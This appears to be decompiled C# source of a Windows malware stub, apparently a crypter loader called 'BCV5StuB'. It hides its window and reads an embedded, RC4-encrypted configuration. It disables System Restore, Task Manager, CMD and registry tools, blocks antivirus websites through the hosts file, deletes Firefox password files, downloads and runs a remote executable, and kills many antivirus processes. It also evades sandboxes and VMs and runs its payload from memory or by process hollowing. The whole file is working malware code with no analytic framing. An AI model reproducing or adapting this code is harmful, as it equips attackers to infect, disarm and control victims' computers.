using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using BCV5StuB.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

namespace BCV5StuB;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer components;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("WebBrowser1")]
	private WebBrowser _WebBrowser1;

	[AccessedThroughProperty("Button1")]
	private Button _Button1;

	[AccessedThroughProperty("CheckBox1")]
	private CheckBox _CheckBox1;

	private string TPath;

	private string filetoinject;

	private const string FileFucker = "Blackout";

	private string filetodo;

	internal virtual Label Label1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label1 = value;
		}
	}

	internal virtual WebBrowser WebBrowser1
	{
		[DebuggerNonUserCode]
		get
		{
			return _WebBrowser1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_WebBrowser1 = value;
		}
	}

	internal virtual Button Button1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Button1 = value;
		}
	}

	internal virtual CheckBox CheckBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _CheckBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_CheckBox1 = value;
		}
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		TPath = Path.GetTempPath();
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		Label1 = new Label();
		WebBrowser1 = new WebBrowser();
		Button1 = new Button();
		CheckBox1 = new CheckBox();
		((Control)this).SuspendLayout();
		Label1.set_AutoSize(true);
		Label label = Label1;
		Point location = new Point(102, 62);
		((Control)label).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label2 = Label1;
		Size size = new Size(39, 13);
		((Control)label2).set_Size(size);
		((Control)Label1).set_TabIndex(0);
		Label1.set_Text("Label1");
		WebBrowser webBrowser = WebBrowser1;
		location = new Point(169, 62);
		((Control)webBrowser).set_Location(location);
		WebBrowser webBrowser2 = WebBrowser1;
		size = new Size(20, 20);
		((Control)webBrowser2).set_MinimumSize(size);
		((Control)WebBrowser1).set_Name("WebBrowser1");
		WebBrowser webBrowser3 = WebBrowser1;
		size = new Size(176, 162);
		((Control)webBrowser3).set_Size(size);
		((Control)WebBrowser1).set_TabIndex(1);
		Button button = Button1;
		location = new Point(199, 13);
		((Control)button).set_Location(location);
		((Control)Button1).set_Name("Button1");
		Button button2 = Button1;
		size = new Size(75, 23);
		((Control)button2).set_Size(size);
		((Control)Button1).set_TabIndex(2);
		((ButtonBase)Button1).set_Text("Button1");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(true);
		((ButtonBase)CheckBox1).set_AutoSize(true);
		CheckBox checkBox = CheckBox1;
		location = new Point(49, 139);
		((Control)checkBox).set_Location(location);
		((Control)CheckBox1).set_Name("CheckBox1");
		CheckBox checkBox2 = CheckBox1;
		size = new Size(81, 17);
		((Control)checkBox2).set_Size(size);
		((Control)CheckBox1).set_TabIndex(3);
		((ButtonBase)CheckBox1).set_Text("CheckBox1");
		((ButtonBase)CheckBox1).set_UseVisualStyleBackColor(true);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(409, 248);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)CheckBox1);
		((Control)this).get_Controls().Add((Control)(object)Button1);
		((Control)this).get_Controls().Add((Control)(object)WebBrowser1);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_Text("Form1");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		//IL_0449: Unknown result type (might be due to invalid IL or missing references)
		((Control)this).set_Visible(false);
		((Form)this).set_ShowInTaskbar(false);
		new decimal(-1096595491L);
		bool flag = is64Bit();
		byte[] bytes = ResourceReader.ReadResource(Application.get_ExecutablePath());
		string @string = Encoding.Default.GetString(bytes);
		string[] array = Strings.Split(@string, "Blackout", -1, (CompareMethod)0);
		string text = array[7];
		string text2 = array[8];
		string text3 = array[9];
		string text4 = array[10];
		string text5 = array[11];
		string text6 = array[12];
		string text7 = array[13];
		string text8 = array[14];
		string text9 = array[15];
		string text10 = array[16];
		string text11 = array[17];
		if (Conversions.ToBoolean(text11))
		{
			((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore", "DisableSR", (object)"1", RegistryValueKind.DWord);
		}
		if (Conversions.ToBoolean(text10))
		{
			((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableRegistryTools", (object)"1", RegistryValueKind.DWord);
		}
		if (Conversions.ToBoolean(text9))
		{
			string path = "C:\\Windows\\System32\\drivers\\etc\\hosts";
			StreamWriter streamWriter = new StreamWriter(path, append: true);
			string value = "\n 127.0.0.1 www.virustotal.com";
			string text12 = "\n 127.0.0.1 www.bitdefender.com";
			string text13 = "\n 127.0.0.1 www.virusscan.jotti.org";
			string text14 = "\n 127.0.0.1 www.scanner.novirusthanks.org";
			streamWriter.Write(value);
			streamWriter.Write("\r\n" + text12);
			streamWriter.Write("\r\n" + text13);
			streamWriter.Write("\r\n" + text14);
			streamWriter.Close();
		}
		if (Conversions.ToBoolean(text8))
		{
			try
			{
				((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\System", "DisableCMD", (object)"1", RegistryValueKind.DWord);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		if (Conversions.ToBoolean(text7))
		{
			string text15 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles";
			if (Directory.Exists(text15))
			{
				foreach (string directory in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(text15))
				{
					foreach (string file in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(directory))
					{
						if (file.Contains("signon"))
						{
							try
							{
								((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(file);
							}
							catch (Exception projectError2)
							{
								ProjectData.SetProjectError(projectError2);
								ProjectData.ClearProjectError();
							}
						}
					}
				}
			}
		}
		if (Conversions.ToBoolean(text6))
		{
			try
			{
				Interaction.Shell("REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f", (AppWinStyle)0, false, -1);
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
		}
		if (Conversions.ToBoolean(text))
		{
			usb.usb_sp();
		}
		if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(TPath + "123.exe"))
		{
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(TPath + "123.exe");
		}
		if (Conversions.ToBoolean(text4))
		{
			((ServerComputer)MyProject.Computer).get_Network().DownloadFile(text5, TPath + "123.exe");
			Process.Start(TPath + "123.exe");
		}
		if (Conversions.ToBoolean(text2))
		{
			rc4.Startup();
		}
		if (Conversions.ToBoolean(text3))
		{
			mofo();
			AntiAntiGen();
			AntiAsquared();
			AntiAvast();
			AntiAVG();
			AntiBullGuard();
			AntiClamAV();
			AntiComodo();
			AntiEstNod32();
			AntiEwido();
			AntiFPROT6();
			AntiKaspersky();
			AntiMcAfee();
			AntiNorton();
			AntiOfficeScan();
			AntiOutPost();
			AntiPCCillin();
			AntiServerProtect();
			AntiSpySweeper();
			AntiThreatExpert();
			AntiVirtualPC();
			AntiZoneAlarm();
		}
		new decimal(-1096595491L);
		if (Conversions.ToBoolean(array[5]))
		{
			filetodo = rc4.rc4(array[6], array[4]);
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			FileSystem.FileOpen(5, folderPath + "\\msconfig_settings.exe", (OpenMode)32, (OpenAccess)3, (OpenShare)(-1), -1);
			FileSystem.FilePut(5, filetodo, -1L, false);
			FileSystem.FileClose(new int[1] { 5 });
			Process.Start(folderPath + "\\msconfig_settings.exe");
		}
		new decimal(-1096595491L);
		if (Conversions.ToBoolean(array[2]))
		{
			Interaction.MsgBox((object)array[1], (MsgBoxStyle)0, (object)null);
		}
		if (flag)
		{
			try
			{
				if (ScanForDotNet())
				{
					Thread thread = new Thread(delegate(object a0)
					{
						runit(Conversions.ToString(a0));
					});
					thread.TrySetApartmentState(ApartmentState.STA);
					thread.Start(filetoinject);
					((Form)this).Close();
				}
				else
				{
					filetoinject = rc4.rc4(array[3], array[4]);
					string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
					FileSystem.FileOpen(5, folderPath2 + "\\msconfig.exe", (OpenMode)32, (OpenAccess)3, (OpenShare)(-1), -1);
					FileSystem.FilePut(5, filetoinject, -1L, false);
					FileSystem.FileClose(new int[1] { 5 });
					Process.Start(folderPath2 + "\\msconfig.exe");
				}
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				Environment.Exit(0);
				ProjectData.ClearProjectError();
			}
			new decimal(-1096595491L);
			return;
		}
		filetoinject = rc4.rc4(array[3], array[4]);
		byte[] bytes2 = Encoding.Default.GetBytes(filetoinject);
		if (ScanForDotNet())
		{
			Thread thread2 = new Thread(delegate(object a0)
			{
				runit(Conversions.ToString(a0));
			});
			thread2.TrySetApartmentState(ApartmentState.STA);
			thread2.Start(filetoinject);
			((Form)this).Close();
			return;
		}
		try
		{
			RunPE runPE = new RunPE();
			bytes2 = Encoding.Default.GetBytes(filetoinject);
			runPE.SRexec(bytes2, Process.GetCurrentProcess().MainModule!.FileName);
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			try
			{
				filetoinject = rc4.rc4(array[3], array[4]);
				string folderPath3 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
				FileSystem.FileOpen(5, folderPath3 + "\\msconfig.exe", (OpenMode)32, (OpenAccess)3, (OpenShare)(-1), -1);
				FileSystem.FilePut(5, filetoinject, -1L, false);
				FileSystem.FileClose(new int[1] { 5 });
				Process.Start(folderPath3 + "\\msconfig.exe");
			}
			catch (Exception projectError6)
			{
				ProjectData.SetProjectError(projectError6);
				Environment.Exit(0);
				new decimal(-1096595491L);
				ProjectData.ClearProjectError();
			}
			ProjectData.ClearProjectError();
		}
	}

	public static bool is64Bit()
	{
		if (Operators.CompareString(Environment.GetEnvironmentVariable("ProgramW6432"), "", false) != 0)
		{
			return true;
		}
		return false;
	}

	public static void AntiSandboxie(Form frmSelect)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0008;
				case 83:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 4:
						case 5:
						case 6:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0008:
					num = 2;
					if (!frmSelect.get_Text().Contains("#"))
					{
						goto end_IL_0000_3;
					}
					break;
					end_IL_0000_2:
					break;
				}
				num = 3;
				frmSelect.Close();
				ProjectData.EndApp();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 83;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void AntiMcAfee()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "mcagentmcuimgr", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public static void AntiAVG()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "avgemc", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public static void AntiAsquared()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "a2servic", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	private void RunFromMemory(byte[] bytes)
	{
		Assembly assembly = Assembly.Load(bytes);
		MethodInfo entryPoint = assembly.EntryPoint;
		object objectValue = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(assembly.CreateInstance(entryPoint.Name))));
		entryPoint.Invoke(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(objectValue))), new object[1] { new string[1] { "1" } });
	}

	public void runit(string split)
	{
		byte[] bytes = Encoding.GetEncoding(1252).GetBytes(split);
		Thread thread = new Thread(delegate(object a0)
		{
			RunFromMemory((byte[])a0);
		});
		thread.TrySetApartmentState(ApartmentState.STA);
		thread.Start(bytes);
		((Form)this).Close();
	}

	private bool ScanForDotNet()
	{
		if (filetoinject.Contains("</assembly>"))
		{
			string[] array = Strings.Split(filetoinject, "</assembly>", -1, (CompareMethod)0);
			if (Operators.CompareString(array[1].ToLower(), "", false) != 0)
			{
				return true;
			}
			bool result = default(bool);
			return result;
		}
		return false;
	}

	public static void AntiAvast()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "ashWebSv", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public static void AntiClamAV()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "clamauto", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public static void AntiComodo()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "cpf", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public static void AntiEwido()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "ewido", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public static void AntiFPROT6()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "FPAVServer", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public static void AntiKaspersky()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "kavsvc", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public static void AntiBullGuard()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "BullGuard", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public static void AntiZoneAlarm()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "VSMON", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public static void AntiAntiGen()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "antigen", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public static void AntiNorton()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "ccapp", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public static void AntiOfficeScan()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "tmlisten", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public static void AntiPCCillin()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "pccntmon", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public static void AntiServerProtect()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "earthagent", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public static void AntiSpySweeper()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "spysweeper", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public static void AntiVirtualPC()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "vpcmapvmsrvc", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public static void AntiOutPost()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "acs.exe", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public static void AntiEstNod32()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "nod32.exenod32krn.exeekrn.exe", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long FindWindowA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpClassName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpWindowName);

	public static void mofo()
	{
		seekit("MSASCui");
		seekit("msmpeng");
		AntiSandboxie();
		IsVmWare();
		AntiThreatExpert();
		checkUsername();
		checkComputername();
	}

	private static void seekit(string gay1)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (process.ProcessName.Contains(gay1))
			{
				try
				{
					process.Kill();
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
	}

	private static void checkUsername()
	{
		List<string> list = new List<string>();
		list.Add("UserName");
		list.Add("User");
		list.Add("honey");
		list.Add("sandbox");
		list.Add("currentuser");
		list.Add("User");
		foreach (string item in list)
		{
			if (Operators.CompareString(Environment.UserName, item, false) == 0)
			{
				Environment.Exit(0);
			}
		}
	}

	private static void checkComputername()
	{
		List<string> list = new List<string>();
		list.Add("ComputerName");
		list.Add("COMPUTERNAME");
		list.Add("DELL-D3E62F7E26");
		list.Add("DWI-9625AC2E275");
		list.Add("MICHAEL-F156CF7");
		foreach (string item in list)
		{
			if (Operators.CompareString(Environment.MachineName, item, false) == 0)
			{
				Environment.Exit(0);
			}
		}
	}

	public static void AntiSandboxie()
	{
		if (Process.GetProcessesByName("SbieSvc").Length >= 1)
		{
			Environment.Exit(0);
		}
	}

	public static void IsVmWare()
	{
		string lpClassName = "VMDragDetectWndClass";
		string lpWindowName = null;
		long num = FindWindowA(ref lpClassName, ref lpWindowName);
		if (num == 0L)
		{
			Environment.Exit(0);
		}
	}

	private static void AntiThreatExpert()
	{
		if (Process.GetCurrentProcess().MainModule!.FileName!.Contains("sample"))
		{
			Environment.Exit(0);
		}
	}
}
